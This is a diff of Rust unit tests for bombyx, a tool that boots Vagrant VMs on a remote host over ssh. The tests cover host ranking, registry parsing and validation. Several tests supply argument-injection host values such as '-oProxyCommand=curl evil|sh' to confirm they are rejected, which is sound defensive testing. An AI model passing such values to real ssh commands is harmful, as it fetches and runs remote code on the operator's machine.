-        // here. `Registry::project` is what reports that, once.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file_with_project(
-            dir.path(),
-            "from-user-file",
-            Some("from-project"),
-        );
-        let sources = HostSources {
-            project: Some("nosuchproject"),
-            ..user_sources(dir.path())
-        };
-        assert_eq!(load(&base, &sources).unwrap().host, "from-user-file");
-    }
-
-    #[test]
-    fn load_reports_which_source_won() {
-        // The origin is what lets a caller *say* which host is in
-        // force without re-deriving the ranking. Asserted for
-        // every source, since a constant would satisfy any one of
-        // them.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file(dir.path(), "from-user-file");
-
-        let origin_of =
-            |sources: &HostSources| Config::load(&base, sources).unwrap().1;
-
-        let user = user_sources(dir.path());
-        assert_eq!(origin_of(&user), HostOrigin::UserFile);
-
-        let env = HostSources {
-            env: Some("from-env"),
-            ..user
-        };
-        assert_eq!(origin_of(&env), HostOrigin::Env);
-
-        let flag = HostSources {
-            flag: Some("from-flag"),
-            ..env
-        };
-        assert_eq!(origin_of(&flag), HostOrigin::Flag);
-    }
-
-    #[test]
-    fn load_reports_a_project_entry_as_the_source() {
-        // The origin carries the project name because a
-        // project's host and the file-wide host come out of the
-        // same file: `config.toml` alone does not say which of
-        // the two won, and `destroy` runs `rm -rf` on the
-        // winner.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file_with_project(
-            dir.path(),
-            "from-user-file",
-            Some("from-project"),
-        );
-        let sources = HostSources {
-            project: Some("myproject"),
-            ..user_sources(dir.path())
-        };
-        let (cfg, origin) = Config::load(&base, &sources).unwrap();
-        assert_eq!(cfg.host, "from-project");
+    fn scratch_dir_is_scoped_to_the_project() {
+        // Without the project segment, `scratch pr-1` from
+        // two projects lands in one directory and the second
+        // boot overwrites the first's `.vagrant/`.
         assert_eq!(
-            origin,
-            HostOrigin::ProjectEntry(
-                crate::name::ProjectName::parse("myproject").unwrap()
-            )
-        );
-        // The notice is built from `Display`, so it has to name
-        // both the entry and the file the operator edits.
-        let text = origin.to_string();
-        assert!(text.contains("myproject"), "{text}");
-        assert!(text.contains(USER_CONFIG_FILE), "{text}");
-    }
-
-    #[test]
-    fn an_invalid_host_in_an_entry_names_that_entry() {
-        // A bad host is reported against the source that
-        // supplied it, and for this source the useful answer is
-        // which table to edit, not just which file.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file_with_project(
-            dir.path(),
-            "good-host",
-            Some("-oProxyCommand=x"),
-        );
-        let sources = HostSources {
-            project: Some("myproject"),
-            ..user_sources(dir.path())
-        };
-        let err = load(&base, &sources).unwrap_err();
-        let text = err.to_string();
-        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
-        assert!(text.contains("myproject"), "{text}");
-        assert!(text.contains(USER_CONFIG_FILE), "{text}");
-        assert!(!text.contains("bombyx.toml"), "{text}");
-    }
-
-    #[test]
-    fn an_invalid_host_names_the_source_that_supplied_it() {
-        // A bad host must be reported against the source that
-        // supplied it. The project file is forbidden to carry a
-        // host at all, so naming it in the message sends the
-        // operator to edit the one file that cannot be at fault.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file(dir.path(), "-oProxyCommand=x");
-        let err = load(&base, &user_sources(dir.path())).unwrap_err();
-        let text = err.to_string();
-        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
-        assert!(text.contains(USER_CONFIG_FILE), "{text}");
-        assert!(!text.contains("bombyx.toml"), "{text}");
-
-        // And the flag names itself rather than a file.
-        let err = load(&base, &flag_sources("-oProxyCommand=x")).unwrap_err();
-        assert!(err.to_string().contains("--host"), "{err}");
-    }
-
-    #[test]
-    fn a_symlinked_user_config_is_followed() {
-        // The symlink refusal exists because a *repo* can commit
-        // one beside the project file. Nothing in a clone can
-        // touch the operator's own config directory, and every
-        // ordinary dotfile manager (stow, chezmoi, a hand-made
-        // `ln -s`) symlinks exactly this file -- which made bombyx
-        // fail on every subcommand with a message that never
-        // mentioned symlinks.
-        let (dir, base) = project_dir(&minimal());
-        let real = dir.path().join("real-config.toml");
-        std::fs::write(&real, "host = \"linked-host\"\n").unwrap();
-
-        let link = dir.path().join(USER_CONFIG_FILE);
-        if !symlink_file(&real, &link) {
-            // Windows needs a privilege for this; the guarantee is
-            // asserted wherever the test can create a link.
-            return;
-        }
-
-        assert_eq!(
-            load(&base, &user_sources(dir.path())).unwrap().host,
-            "linked-host"
+            good().remote_scratch_dir(&scratch("pr-1234")),
+            "~/vms/scratch/myproject/pr-1234"
         );
     }
 
     #[test]
-    fn a_symlinked_project_config_is_still_refused() {
-        // The other half of the same rule, and the reason it
-        // exists: pointed at a private key, the TOML parse error
-        // would echo a line of it to stderr.
-        let dir = tempfile::tempdir().unwrap();
-        let real = dir.path().join("real.toml");
-        std::fs::write(&real, minimal()).unwrap();
-        let link = dir.path().join("bombyx.toml");
-        if !symlink_file(&real, &link) {
-            return;
-        }
-        assert!(matches!(
-            load(&link, &flag_sources("vmhost")).unwrap_err(),
-            ConfigError::NotAFile(_)
-        ));
-    }
-
-    /// Creates a file symlink, or `false` where not permitted.
-    fn symlink_file(target: &Path, link: &Path) -> bool {
-        #[cfg(windows)]
-        let result = std::os::windows::fs::symlink_file(target, link);
-        #[cfg(not(windows))]
-        let result = std::os::unix::fs::symlink(target, link);
-        result.is_ok()
-    }
-
-    #[test]
-    fn an_empty_host_env_var_counts_as_unset() {
-        // An exported-but-empty variable is how a shell says "no
-        // value". Taking it literally would report an empty-field
-        // error naming a file the operator never edited.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file(dir.path(), "my-vmhost");
-        let sources = HostSources {
-            env: Some("  "),
-            ..user_sources(dir.path())
-        };
-        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
-    }
-
-    #[test]
-    fn a_broken_user_config_is_not_read_when_a_flag_wins() {
-        // `--host` has to work on a machine whose per-developer
-        // file is missing, unreadable or malformed -- that is
-        // half the point of having a flag.
-        let (dir, base) = project_dir(&minimal());
-        std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
-        let sources = HostSources {
-            flag: Some("mine"),
-            user_config_dir: Some(dir.path()),
-            ..HostSources::default()
-        };
-        assert_eq!(load(&base, &sources).unwrap().host, "mine");
-    }
-
-    #[test]
-    fn a_user_config_rejects_an_unknown_key() {
-        // A typo in a file nobody reads twice must be an error,
-        // not a setting that silently does nothing.
-        let (dir, base) = project_dir(&minimal());
-        std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
-            .unwrap();
-        let sources = HostSources {
-            user_config_dir: Some(dir.path()),
-            ..HostSources::default()
-        };
-        let err = load(&base, &sources).unwrap_err();
-        assert!(matches!(err, ConfigError::Parse { .. }));
-        assert!(err.to_string().contains(USER_CONFIG_FILE));
-    }
-
-    #[test]
-    fn a_projects_table_does_not_stop_the_host_being_read() {
-        // The registry carries project entries as well as the
-        // host, and `deny_unknown_fields` refuses every key the
-        // struct does not name. So a file with both must still
-        // give up its host.
-        let (dir, base) = project_dir(&minimal());
-        std::fs::write(
-            dir.path().join(USER_CONFIG_FILE),
-            format!(
-                "host = \"my-vmhost\"\n\n\
-                 [projects.myproject]\n\
-                 remote_root = \"~/vms\"\n\
-                 {}",
-                REQUIRED_TABLES
-                    .replace("[vm]", "[projects.myproject.vm]")
-                    .replace("[source]", "[projects.myproject.source]")
-            ),
+    fn scratch_dirs_of_two_projects_do_not_collide() {
+        let a = good();
+        let b = Config::parse_registry(
+            &test_registry("ledgerstone", "vmhost", None),
+            Path::new(USER_CONFIG_FILE),
+            "ledgerstone",
         )
         .unwrap();
-        let sources = user_sources(dir.path());
-        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
-    }
-
-    #[test]
-    fn a_user_config_without_a_host_is_not_a_host() {
-        // The file exists and parses but names nothing, which
-        // must read the same as no file at all.
-        let (dir, base) = project_dir(&minimal());
-        std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
-        let sources = HostSources {
-            user_config_dir: Some(dir.path()),
-            ..HostSources::default()
-        };
-        assert!(matches!(
-            load(&base, &sources).unwrap_err(),
-            ConfigError::HostMissing { .. }
-        ));
-    }
-
-    #[test]
-    fn a_host_from_the_environment_is_still_validated() {
-        // The charset check protects the argv, not the repo: every
-        // source that can still supply a host reaches `ssh` as
-        // its first argument, and a mistake fills any of them
-        // in. The file source is covered by
-        // `an_invalid_host_names_the_source_that_supplied_it`;
-        // this is the environment, which no file check reaches.
-        let (dir, base) = project_dir(&minimal());
-        let sources = HostSources {
-            env: Some("-oProxyCommand=x"),
-            ..user_sources(dir.path())
-        };
-        let err = load(&base, &sources).unwrap_err();
-        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
-        assert!(err.to_string().contains(HOST_ENV), "{err}");
+        let name = scratch("pr-1");
+        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
     }
 
     /// [`config_dir_from`] against a fixed environment.
@@ -1316,39 +664,67 @@ mod tests {
         }
     }
 
-    #[test]
-    fn an_oversized_config_is_refused() {
+    /// The registry file `registry_with` describes, written into
+    /// a fresh directory.
+    fn registry_file_in_a_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
         let dir = tempfile::tempdir().unwrap();
-        let base = dir.path().join("bombyx.toml");
+        let path = dir.path().join(USER_CONFIG_FILE);
+        std::fs::write(&path, source).unwrap();
+        (dir, path)
+    }
+
+    #[test]
+    fn an_oversized_registry_is_refused() {
         // `usize::try_from` rather than `as`: the cap is a
         // `u64`, and a bare cast is a truncation waiting for a
         // 32-bit target.
         let over = usize::try_from(MAX_CONFIG_BYTES).unwrap() + 1;
-        std::fs::write(&base, "#".repeat(over)).unwrap();
-
-        assert!(matches!(
-            load(&base, &flag_sources("vmhost")).unwrap_err(),
-            ConfigError::TooLarge(_)
-        ));
+        let (_dir, path) = registry_file_in_a_dir(&"#".repeat(over));
+        let err = Config::load_project("myproject", Some(&path)).unwrap_err();
+        assert!(matches!(err, ConfigError::TooLarge(_)), "{err:?}");
     }
 
     #[test]
-    fn accepts_a_user_at_host_destination() {
-        let host = "igor@vmhost.local";
-        assert_eq!(parse_with_host(host).unwrap().host, host);
+    fn a_directory_named_as_the_registry_is_not_a_file() {
+        // Was a `Read` error carrying whatever the OS said,
+        // which differs per platform ("Is a directory" on Unix,
+        // "Access is denied" on Windows) and explains nothing.
+        // The type check answers this case first and says what
+        // is actually wrong.
+        let dir = tempfile::tempdir().unwrap();
+        let err =
+            Config::load_project("myproject", Some(dir.path())).unwrap_err();
+        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
     }
 
     #[test]
-    fn rejects_invalid_toml() {
-        let err = parse("project = ").unwrap_err();
-        assert!(matches!(err, ConfigError::Parse { .. }));
-        assert!(err.to_string().contains("bombyx.toml"));
+    fn a_symlinked_registry_is_followed() {
+        // Every ordinary dotfile manager (stow, chezmoi, a
+        // hand-made `ln -s`) symlinks exactly this file, and
+        // refusing one made bombyx fail on every subcommand with
+        // a message that never mentioned symlinks.
+        let (dir, link) = registry_file_in_a_dir("");
+        std::fs::remove_file(&link).unwrap();
+        let real = dir.path().join("real-config.toml");
+        std::fs::write(&real, registry_with("")).unwrap();
+        if !symlink_file(&real, &link) {
+            // Windows needs a privilege for this; the guarantee
+            // is asserted wherever the test can create a link.
+            return;
+        }
+
+        let (cfg, _origin) =
+            Config::load_project("myproject", Some(&link)).unwrap();
+        assert_eq!(cfg.host, "vmhost");
     }
 
-    #[test]
-    fn rejects_missing_required_field() {
-        let err = parse("remote_root = \"/srv/v\"\n").unwrap_err();
-        assert!(matches!(err, ConfigError::Parse { .. }));
+    /// Creates a file symlink, or `false` where not permitted.
+    fn symlink_file(target: &Path, link: &Path) -> bool {
+        #[cfg(windows)]
+        let result = std::os::windows::fs::symlink_file(target, link);
+        #[cfg(not(windows))]
+        let result = std::os::unix::fs::symlink(target, link);
+        result.is_ok()
     }
 
     /// Every `[vm]` and `[source]` field, with the line that
@@ -1371,13 +747,17 @@ mod tests {
         ("source", "script", "script = \"vagrant/provision.sh\""),
     ];
 
-    /// A project file stating every required field except
-    /// `omitted`, which names one entry of [`TABLE_FIELDS`].
-    fn config_without(omitted: &str) -> String {
-        let mut src = String::from("project = \"myproject\"\n");
+    /// A registry stating every required field except `omitted`,
+    /// which names one entry of [`TABLE_FIELDS`].
+    ///
+    /// Pass `""` to omit nothing, which is what the tests about
+    /// a *missing table* start from.
+    fn entry_without(omitted: &str) -> String {
+        let mut src = String::from("host = \"vmhost\"\n\n");
+        src.push_str("[projects.myproject]\n");
         for table in ["vm", "source"] {
             use std::fmt::Write as _;
-            let _ = writeln!(src, "\n[{table}]");
+            let _ = writeln!(src, "\n[projects.myproject.{table}]");
             for (owner, field, line) in TABLE_FIELDS {
                 if owner == table && field != omitted {
                     src.push_str(line);
@@ -1407,17 +787,8 @@ mod tests {
         // partial table, so a failure names the field that
         // stopped being required instead of only reporting that
         // something did.
-        //
-        // `parse_project_file` rather than the `parse` helper:
-        // the fixture states both tables, so `completed` would
-        // leave it alone, and stating them is the point -- the
-        // omission has to be visible in the table the test
-        // writes.
         for (_, omitted, _) in TABLE_FIELDS {
-            let src = config_without(omitted);
-            let err =
-                parse_project_file(&src, Path::new("bombyx.toml"), "vmhost")
-                    .unwrap_err();
+            let err = parse_whole(&entry_without(omitted)).unwrap_err();
             let text = err.to_string();
             assert!(
                 matches!(err, ConfigError::Parse { .. }),
@@ -1431,182 +802,7 @@ mod tests {
     }
 
     #[test]
-    fn rejects_an_unknown_key() {
-        // A typo must be reported, not silently defaulted. A
-        // silently defaulted key builds the VM to the wrong
-        // specification, and the message the operator gets
-        // describes the VM rather than the typo.
-        let src = "project = \"p\"\n\
-                   remote_rot = \"~/vms\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(err, ConfigError::Parse { .. }));
-        assert!(err.to_string().contains("remote_rot"));
-    }
-
-    #[test]
-    fn rejects_empty_host() {
-        // `--host ""` was typed, so it is reported as an empty
-        // field rather than treated as unset.
-        let err = parse_with_host("").unwrap_err();
-        assert!(matches!(err, ConfigError::Empty { field: "host" }));
-    }
-
-    #[test]
-    fn rejects_whitespace_only_project() {
-        let src = "project = \"  \"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(err, ConfigError::Empty { field: "project" }));
-    }
-
-    #[test]
-    fn a_bad_remote_root_in_toml_surfaces_as_a_field_error() {
-        // Every `remote_root` rule, and the tests enumerating
-        // the family it refuses, live in `config::root`. What
-        // this covers is the seam: a value refused there has
-        // to come back out of the project-file parse naming the
-        // field, so an operator is told which key to edit.
-        for (root, want) in [
-            ("", "must not be empty"),
-            ("vms", "must start with"),
-            ("~vms", "must start with"),
-            ("/.", "`.` segment"),
-            ("~", "at least 1 directory"),
-        ] {
-            let src = format!("project = \"p\"\nremote_root = \"{root}\"\n");
-            let err = parse(&src).unwrap_err();
-            assert!(
-                matches!(
-                    &err,
-                    ConfigError::Empty {
-                        field: "remote_root"
-                    } | ConfigError::Invalid {
-                        field: "remote_root",
-                        ..
-                    }
-                ),
-                "remote_root {root:?} must be refused, got {err:?}"
-            );
-            assert!(err.to_string().contains(want), "{root:?}: {err}");
-        }
-    }
-
-    #[test]
-    fn rejects_a_project_that_is_not_one_segment() {
-        // The length rule is here with the rest of the segment
-        // rules. The registry keys the same value with a type
-        // that enforces it, and two guards on one value must not
-        // disagree about what they allow.
-        for bad in ["../../etc", &"a".repeat(crate::name::MAX_NAME_LEN + 1)] {
-            let src = format!("project = {bad:?}\n");
-            let err = parse(&src).unwrap_err();
-            assert!(
-                matches!(
-                    err,
-                    ConfigError::Invalid {
-                        field: "project",
-                        ..
-                    }
-                ),
-                "{bad:?} was accepted"
-            );
-        }
-    }
-
-    #[test]
-    fn builds_remote_project_dir() {
-        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
-    }
-
-    #[test]
-    fn remote_project_dir_ignores_trailing_slash() {
-        let src = "project = \"p\"\nremote_root = \"/srv/\"\n";
-        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
-    }
-
-    #[test]
-    fn scratch_dir_is_scoped_to_the_project() {
-        // Without the project segment, `scratch pr-1` from
-        // two projects lands in one directory and the second
-        // boot overwrites the first's `.vagrant/`.
-        assert_eq!(
-            good().remote_scratch_dir(&scratch("pr-1234")),
-            "~/vms/scratch/myproject/pr-1234"
-        );
-    }
-
-    #[test]
-    fn scratch_dirs_of_two_projects_do_not_collide() {
-        let a = good();
-        let src = "project = \"ledgerstone\"\n";
-        let b = parse(src).unwrap();
-        let name = scratch("pr-1");
-        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
-    }
-
-    #[test]
-    fn load_reports_missing_file() {
-        let path = Path::new("definitely-not-here-bombyx.toml");
-        let err = load(path, &flag_sources("vmhost")).unwrap_err();
-        assert!(matches!(err, ConfigError::NotFound(_)));
-        assert!(err.to_string().contains("config file not found"));
-    }
-
-    #[test]
-    fn load_reads_an_existing_file() {
-        let dir = tempfile::tempdir().unwrap();
-        let path = dir.path().join("bombyx.toml");
-        std::fs::write(&path, minimal()).unwrap();
-        let cfg = load(&path, &flag_sources("vmhost")).unwrap();
-        assert_eq!(cfg.project, "myproject");
-    }
-
-    #[test]
-    fn load_reports_a_directory_as_not_a_file() {
-        // Was a `Read` error carrying whatever the OS said,
-        // which differs per platform ("Is a directory" on Unix,
-        // "Access is denied" on Windows) and explains nothing.
-        // The type check that keeps a symlinked project file
-        // from being read answers this case first, and says what
-        // is actually wrong.
-        let dir = tempfile::tempdir().unwrap();
-        let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
-        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
-    }
-
-    /// A project file carrying every required section.
-    ///
-    /// Tests that exercise one bad field start from this and
-    /// replace a line, so a failure names the field under test
-    /// rather than a section someone forgot.
-    fn full_toml() -> String {
-        // The shared tables with `cpus`/`memory` raised, so a
-        // test varying one can tell its value from the default.
-        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
-            .replace("cpus = 2", "cpus = 4")
-            .replace("memory = 2048", "memory = 8192")
-    }
-
-    fn parse_full(source: &str) -> Result<Config, ConfigError> {
-        parse_project_file(source, Path::new("bombyx.toml"), "vmhost")
-    }
-
-    #[test]
-    fn parses_the_vm_and_source_sections() {
-        let cfg = parse_full(&full_toml()).unwrap();
-        assert_eq!(cfg.vm.provider, Provider::Libvirt);
-        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
-        assert_eq!(cfg.vm.cpus, 4);
-        assert_eq!(cfg.vm.memory, 8192);
-        assert_eq!(
-            cfg.source.repo.as_str(),
-            "https://example.invalid/myproject.git"
-        );
-        assert_eq!(cfg.source.git_ref, "main");
-        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
-    }
-
-    #[test]
-    fn requires_both_new_sections() {
+    fn an_entry_requires_both_tables() {
         // Neither has a defensible default. A box is the one
         // thing bombyx cannot invent, and a repository bombyx
         // guessed at would be cloned into the guest and run as
@@ -1615,34 +811,57 @@ mod tests {
         // One table removed at a time, and the loop below skips
         // only the named one. Building the input with
         // `take_while` instead would truncate the file at that
-        // header, so removing `[vm]` would drop `[source]` too
-        // and neither case would be isolated.
-        for missing in ["[vm]", "[source]"] {
+        // header, so removing the `[vm]` table would drop the
+        // `[source]` one too and neither case would be isolated.
+        for missing in ["vm", "source"] {
+            let header = format!("[projects.myproject.{missing}]");
             let mut source = String::new();
             let mut skipping = false;
-            for line in full_toml().lines() {
+            for line in entry_without("").lines() {
                 if line.starts_with('[') {
-                    skipping = line.starts_with(missing);
+                    skipping = line == header;
                 }
                 if !skipping {
                     source.push_str(line);
                     source.push('\n');
                 }
             }
+            let kept = if missing == "vm" { "source" } else { "vm" };
             assert!(
-                source.contains(if missing == "[vm]" {
-                    "[source]"
-                } else {
-                    "[vm]"
-                }),
+                source.contains(&format!("[projects.myproject.{kept}]")),
                 "only {missing} may be removed"
             );
-            let err = parse_full(&source).unwrap_err();
+            let err = parse_whole(&source).unwrap_err();
             assert!(
                 matches!(err, ConfigError::Parse { .. }),
-                "a file without {missing} must be refused: {err:?}"
+                "an entry without {missing} must be refused: {err:?}"
             );
         }
+    }
+
+    /// An entry stating every field, with `cpus` and `memory`
+    /// raised off their defaults.
+    ///
+    /// Tests that exercise one bad field start from this and
+    /// replace a line, so a failure names the field under test
+    /// rather than a table someone forgot. The raised values are
+    /// what let a test tell a stated number from a default one.
+    fn full_registry() -> String {
+        entry_without("")
+            .replace("cpus = 2", "cpus = 4")
+            .replace("memory = 2048", "memory = 8192")
+    }
+
+    #[test]
+    fn reads_the_vm_and_source_tables() {
+        let cfg = parse_whole(&full_registry()).unwrap();
+        assert_eq!(cfg.vm.provider, Provider::Libvirt);
+        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
+        assert_eq!(cfg.vm.cpus, 4);
+        assert_eq!(cfg.vm.memory, 8192);
+        assert_eq!(cfg.source.repo.as_str(), "https://example.invalid/p.git");
+        assert_eq!(cfg.source.git_ref, "main");
+        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
     }
 
     #[test]
@@ -1651,8 +870,8 @@ mod tests {
         // provider renders a Vagrantfile no vagrant can use,
         // and the error would arrive on the VM host after
         // bombyx had already created a directory there.
-        let source = full_toml().replace("libvirt", "virtualbox");
-        let err = parse_full(&source).unwrap_err();
+        let source = full_registry().replace("libvirt", "virtualbox");
+        let err = parse_whole(&source).unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }), "{err:?}");
     }
 
@@ -1664,8 +883,8 @@ mod tests {
             ("cpus", "cpus = 4", "cpus = 0"),
             ("memory", "memory = 8192", "memory = 0"),
         ] {
-            let source = full_toml().replace(from, to);
-            let err = parse_full(&source).unwrap_err();
+            let source = full_registry().replace(from, to);
+            let err = parse_whole(&source).unwrap_err();
             assert!(
                 matches!(&err, ConfigError::Invalid { field: f, .. }
                     if *f == field),
@@ -1693,7 +912,7 @@ mod tests {
                 ("a\\b", "would end or escape"),
                 ("a#{1}b", "Ruby interpolation"),
             ] {
-                let source: String = full_toml()
+                let source: String = full_registry()
                     .lines()
                     .map(|l| {
                         if l.starts_with(&format!("{field} = ")) {
@@ -1723,7 +942,7 @@ mod tests {
                 // `missing field` or `unknown field` -- and then
                 // this test would go green on a fixture that had
                 // drifted, while proving nothing about the guard.
-                let err = parse_full(&source).unwrap_err().to_string();
+                let err = parse_whole(&source).unwrap_err().to_string();
                 assert!(
                     err.contains(&format!("`{field}`")) && err.contains(reason),
                     "{field} must refuse {bad:?} with {reason:?}, got {err}"
@@ -1744,16 +963,15 @@ mod load_project_tests {
     /// drops.
     ///
     /// No file is written. `Config::load_project`'s own reading
-    /// is covered by the two tests that do write one, and every
-    /// test about ranking or assembly goes through here.
+    /// is covered by the tests that do write one, and every test
+    /// about ranking or assembly goes through here.
     fn load(
         source: &str,
         name: &str,
-        sources: &HostSources,
     ) -> Result<(Config, HostOrigin), ConfigError> {
         let registry =
             registry::parse_for_tests(source, Path::new(USER_CONFIG_FILE))?;
-        Config::from_registry(&registry, name, sources)
+        Config::from_registry(&registry, name)
     }
 
     /// A registry naming one project and nothing unusual.
@@ -1761,17 +979,22 @@ mod load_project_tests {
         test_registry("myproject", "vmhost", None)
     }
 
+    /// The `myproject` entry as [`HostOrigin`] names it.
+    fn entry_origin() -> HostOrigin {
+        HostOrigin::ProjectEntry(
+            crate::name::ProjectName::parse("myproject").unwrap(),
+        )
+    }
+
     #[test]
     fn every_setting_comes_out_of_the_entry() {
-        let (cfg, origin) =
-            load(&plain(), "myproject", &HostSources::default()).unwrap();
+        let (cfg, origin) = load(&plain(), "myproject").unwrap();
 
         // The table key becomes the project name: the entry does
         // not carry one, so the two cannot disagree.
         assert_eq!(cfg.project, "myproject");
         assert_eq!(cfg.host, "vmhost");
-        // Absent from the entry, so the same default a
-        // `bombyx.toml` gets.
+        // Absent from the entry, so the default applies.
         assert_eq!(cfg.remote_root, DEFAULT_REMOTE_ROOT);
         assert_eq!(cfg.vm.provider, Provider::Libvirt);
         assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
@@ -1787,104 +1010,65 @@ mod load_project_tests {
     #[test]
     fn the_entrys_own_host_outranks_the_file_wide_one() {
         let source = test_registry("myproject", "file-wide", Some("entry"));
-        let (cfg, origin) =
-            load(&source, "myproject", &HostSources::default()).unwrap();
+        let (cfg, origin) = load(&source, "myproject").unwrap();
         assert_eq!(cfg.host, "entry");
-        assert_eq!(
-            origin,
-            HostOrigin::ProjectEntry(
-                crate::name::ProjectName::parse("myproject").unwrap()
-            )
-        );
+        assert_eq!(origin, entry_origin());
     }
 
     #[test]
-    fn the_host_is_ranked_for_the_project_being_loaded() {
-        // `HostSources.project` names one project and the load
-        // names another. The settings and the host have to come
-        // from the same entry: taking the host from `other`
-        // would boot `myproject`'s VM on `other`'s machine, and
-        // `destroy` would `rm -rf` there.
+    fn the_reported_entry_names_its_table_and_its_file() {
+        // The startup notice is built from `describe`, and it
+        // exists so the operator can see which machine `destroy`
+        // will run `rm -rf` on. Both `host` keys live in one
+        // file, so the table has to be named as well as the
+        // file -- and the file is the path bombyx read, not the
+        // default name, because `--config` takes any path.
+        let path = Path::new("/home/dev/elsewhere.toml");
+        let text = entry_origin().describe(Some(path));
+        assert!(text.contains("myproject"), "{text}");
+        assert!(text.contains("/home/dev/elsewhere.toml"), "{text}");
+        assert!(!text.contains(USER_CONFIG_FILE), "{text}");
+    }
+
+    #[test]
+    fn the_host_comes_from_the_entry_being_loaded() {
+        // Two entries, each naming its own machine. Taking the
+        // host from the other one would boot `myproject`'s VM on
+        // `other`'s machine, and `destroy` would `rm -rf` there.
         let source = format!(
             "{}\n{}",
             test_registry("myproject", "file-wide", Some("mine")),
             test_entry("other", Some("theirs"))
         );
-        let sources = HostSources {
-            project: Some("other"),
-            ..HostSources::default()
-        };
-        let (cfg, origin) = load(&source, "myproject", &sources).unwrap();
+        let (cfg, origin) = load(&source, "myproject").unwrap();
         assert_eq!(cfg.host, "mine");
-        assert_eq!(
-            origin,
-            HostOrigin::ProjectEntry(
-                crate::name::ProjectName::parse("myproject").unwrap()
-            )
-        );
+        assert_eq!(origin, entry_origin());
     }
 
     #[test]
-    fn the_flag_still_outranks_the_file() {
-        let sources = HostSources {
-            flag: Some("from-flag"),
-            ..HostSources::default()
-        };
-        let (cfg, origin) = load(
-            &test_registry("myproject", "vmhost", Some("entry")),
-            "myproject",
-            &sources,
-        )
-        .unwrap();
-        assert_eq!(cfg.host, "from-flag");
-        assert_eq!(origin, HostOrigin::Flag);
-    }
-
-    #[test]
-    fn a_host_from_the_flag_that_ssh_would_read_as_an_option() {
-        // The winning source is checked, whichever it is, and
-        // the message names that source rather than the field:
-        // `--host` is not a key anyone can edit in a file.
-        let sources = HostSources {
-            flag: Some("-oProxyCommand=curl evil|sh"),
-            ..HostSources::default()
-        };
-        let err = load(&plain(), "myproject", &sources).unwrap_err();
-        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
+    fn no_host_anywhere_in_the_file_says_to_add_one() {
+        // The file parses and names a machine nowhere, which
+        // must read as a setting to add rather than as a broken
+        // file.
+        let err =
+            load(&test_entry("myproject", None), "myproject").unwrap_err();
+        assert!(matches!(err, ConfigError::HostMissing { .. }), "{err}");
         let text = err.to_string();
-        assert!(text.contains("--host"), "{text}");
-    }
-
-    #[test]
-    fn a_broken_entry_is_refused_even_when_the_flag_names_the_host() {
-        // Every run checks the entry, not only a run that goes
-        // to the file for its host. `--host` here means the
-        // ranking stops at the flag and never reads a key out of
-        // the registry, and the `cpus = 0` in it is still
-        // refused -- otherwise bombyx would boot a VM from a
-        // description nothing had checked.
-        let source = plain().replace("cpus = 2", "cpus = 0");
-        let sources = HostSources {
-            flag: Some("from-flag"),
-            ..HostSources::default()
-        };
-        let err = load(&source, "myproject", &sources).unwrap_err();
-        let text = err.to_string();
-        assert!(text.contains("cpus"), "{text}");
+        assert!(text.contains(USER_CONFIG_FILE), "{text}");
+        assert!(text.contains("`host`"), "{text}");
     }
 
     #[test]
     fn a_broken_entry_is_reported_before_a_missing_host() {
         // Both are wrong at once: the entry says `cpus = 0` and
-        // no source names a host. The entry is read first, so
-        // the entry's problem is what the operator is told
-        // about. It is the one they can act on with the file
+        // neither `host` key names a machine. The entry is read
+        // first, so the entry's problem is what the operator is
+        // told about. It is the one they can act on with the file
         // already open, and the host message would send them to
         // that same file for a second edit.
         let source =
             test_entry("myproject", None).replace("cpus = 2", "cpus = 0");
-        let err =
-            load(&source, "myproject", &HostSources::default()).unwrap_err();
+        let err = load(&source, "myproject").unwrap_err();
         let text = err.to_string();
         assert!(text.contains("cpus"), "{text}");
         assert!(
@@ -1895,27 +1079,24 @@ mod load_project_tests {
 
     #[test]
     fn a_name_with_no_table_names_the_table_to_write() {
-        let err =
-            load("host = \"vmhost\"\n", "myproject", &HostSources::default())
-                .unwrap_err();
+        let err = load("host = \"vmhost\"\n", "myproject").unwrap_err();
         assert!(matches!(err, ConfigError::ProjectNotFound { .. }), "{err}");
         let text = err.to_string();
         assert!(text.contains("[projects.\"myproject\"]"), "{text}");
     }
 
     #[test]
-    fn the_registry_file_is_read_from_the_config_directory() {
+    fn the_registry_is_read_from_the_path_it_is_given() {
         // The one test that goes through the file, so
         // `Config::load_project`'s own reading is exercised
-        // rather than only the assembly below it.
+        // rather than only the assembly below it. The file is
+        // named `elsewhere.toml` because `--config` takes any
+        // path, so nothing may depend on the default name.
         let dir = tempfile::tempdir().unwrap();
-        std::fs::write(dir.path().join(USER_CONFIG_FILE), plain()).unwrap();
-        let sources = HostSources {
-            user_config_dir: Some(dir.path()),
-            ..HostSources::default()
-        };
